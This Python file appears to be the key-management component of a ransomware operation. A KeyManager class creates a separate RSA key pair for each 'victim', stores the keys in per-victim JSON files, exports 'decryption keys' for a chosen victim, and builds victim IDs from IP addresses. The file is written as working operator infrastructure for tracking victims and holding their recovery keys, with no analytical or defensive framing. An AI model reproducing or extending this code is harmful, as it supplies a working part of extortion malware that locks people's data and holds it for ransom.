# key_manager.py - RSA Key Management
import os
import json
import time

from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import base64


class KeyManager:
    def __init__(self, key_dir="keys"):
        self.key_dir = key_dir
        self.private_key = None
        self.public_key = None
        self.victim_keys = {}  # Store victim-specific keys

        # Ensure key directory exists
        os.makedirs(self.key_dir, exist_ok=True)

    def generate_rsa_keypair(self, key_size=4096):
        """Generate RSA key pair"""
        private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=key_size,
            backend=default_backend()
        )

        public_key = private_key.public_key()

        # Serialize keys
        private_pem = private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption()
        )

        public_pem = public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )

        return private_pem, public_pem

    def load_server_keys(self):
        """Load or generate server keys"""
        private_key_path = os.path.join(self.key_dir, "server_private.pem")
        public_key_path = os.path.join(self.key_dir, "server_public.pem")

        try:
            if os.path.exists(private_key_path) and os.path.exists(public_key_path):
                with open(private_key_path, "rb") as f:
                    self.private_key = f.read()
                with open(public_key_path, "rb") as f:
                    self.public_key = f.read()
                print("[+] Loaded existing server keys")
            else:
                self.private_key, self.public_key = self.generate_rsa_keypair()
                with open(private_key_path, "wb") as f:
                    f.write(self.private_key)
                with open(public_key_path, "wb") as f:
                    f.write(self.public_key)
                print("[+] Generated new server RSA key pair")

            return True
        except Exception as e:
            print(f"[-] Key loading error: {e}")
            return False

    def generate_victim_keypair(self, victim_id):
        """Generate unique key pair for a victim"""
        private_pem, public_pem = self.generate_rsa_keypair()

        # Store victim keys
        self.victim_keys[victim_id] = {
            'private_key': private_pem,
            'public_key': public_pem,
            'generated_at': time.time()
        }

        # Save to file
        victim_key_path = os.path.join(self.key_dir, f"victim_{victim_id}.json")
        with open(victim_key_path, 'w') as f:
            json.dump({
                'victim_id': victim_id,
                'private_key': private_pem.decode('utf-8'),
                'public_key': public_pem.decode('utf-8'),
                'generated_at': time.time()
            }, f, indent=2)

        return public_pem

    def get_victim_private_key(self, victim_id):
        """Get private key for specific victim"""
        if victim_id in self.victim_keys:
            return self.victim_keys[victim_id]['private_key']

        # Try to load from file
        victim_key_path = os.path.join(self.key_dir, f"victim_{victim_id}.json")
        if os.path.exists(victim_key_path):
            try:
                with open(victim_key_path, 'r') as f:
                    key_data = json.load(f)
                    return key_data['private_key'].encode('utf-8')
            except Exception as e:
                print(f"[-] Error loading victim key: {e}")

        return None

    def get_victim_public_key(self, victim_id):
        """Get public key for specific victim"""
        if victim_id in self.victim_keys:
            return self.victim_keys[victim_id]['public_key']

        # Try to load from file
        victim_key_path = os.path.join(self.key_dir, f"victim_{victim_id}.json")
        if os.path.exists(victim_key_path):
            try:
                with open(victim_key_path, 'r') as f:
                    key_data = json.load(f)
                    return key_data['public_key'].encode('utf-8')
            except Exception as e:
                print(f"[-] Error loading victim public key: {e}")

        return None

    def list_victim_keys(self):
        """List all stored victim keys"""
        victim_keys = []
        for filename in os.listdir(self.key_dir):
            if filename.startswith("victim_") and filename.endswith(".json"):
                victim_id = filename[7:-5]  # Remove "victim_" and ".json"
                victim_keys.append(victim_id)
        return victim_keys

    def export_decryption_key(self, victim_id, output_path=None):
        """Export decryption key for a victim"""
        private_key = self.get_victim_private_key(victim_id)
        if not private_key:
            print(f"[-] No key found for victim {victim_id}")
            return False

        if not output_path:
            output_path = f"decryption_key_{victim_id}.pem"

        try:
            with open(output_path, "wb") as f:
                f.write(private_key)
            print(f"[+] Decryption key exported to {output_path}")
            return True
        except Exception as e:
            print(f"[-] Export error: {e}")
            return False

    def import_victim_key(self, victim_id, private_key_pem):
        """Import existing victim key"""
        try:
            # Validate the key
            private_key = serialization.load_pem_private_key(
                private_key_pem,
                password=None,
                backend=default_backend()
            )

            # Store the key
            self.victim_keys[victim_id] = {
                'private_key': private_key_pem,
                'public_key': private_key.public_key().public_bytes(
                    encoding=serialization.Encoding.PEM,
                    format=serialization.PublicFormat.SubjectPublicKeyInfo
                ),
                'imported_at': time.time()
            }

            # Save to file
            victim_key_path = os.path.join(self.key_dir, f"victim_{victim_id}.json")
            with open(victim_key_path, 'w') as f:
                json.dump({
                    'victim_id': victim_id,
                    'private_key': private_key_pem.decode('utf-8'),
                    'public_key': self.victim_keys[victim_id]['public_key'].decode('utf-8'),
                    'imported_at': time.time()
                }, f, indent=2)

            print(f"[+] Successfully imported key for victim {victim_id}")
            return True

        except Exception as e:
            print(f"[-] Key import error: {e}")
            return False

    def get_server_public_key(self):
        """Get server public key"""
        return self.public_key

    def get_server_private_key(self):
        """Get server private key"""
        return self.private_key


# Utility function for victim ID generation
def generate_victim_id(ip_address, machine_info=""):
    """Generate unique victim ID"""
    import hashlib
    unique_string = f"{ip_address}_{machine_info}_{time.time()}"
    return hashlib.md5(unique_string.encode()).hexdigest()[:12]